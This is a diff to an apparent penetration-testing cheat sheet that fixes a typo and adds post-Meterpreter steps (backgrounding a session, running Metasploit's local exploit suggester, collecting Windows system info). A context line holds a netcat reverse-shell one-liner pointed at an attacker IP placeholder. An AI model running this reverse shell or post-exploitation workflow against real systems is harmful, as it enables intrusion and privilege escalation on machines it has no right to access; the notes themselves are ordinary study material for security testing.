@@ -34,7 +34,7 @@ $/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
 
 ## Upgrading/Stablizing Shells:
 
-+ <b>Using Ptyhon</b>
++ <b>Using Python</b>
 
 *Upgrading:*
 ```
@@ -47,6 +47,29 @@ $export TERM=xterm
 $^Z
 $stty raw -echo; fg
 (ENTER)
+```
+## Post-Meterpreter Shell To-Do's:
++ <b>Background Meterpreter Session</b>
+```
+^Z
+Y
+```
++ <b>Use Local Exploit Suggester</b>
+```
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
+
+### Windows Target:
++ <b>Get System Info (from meterpreter session)</b>
+```
+sysinfo
+```
+
++ <b>Get System Info (standard shell)</b>
+```
+systeminfo
 ```
 
 
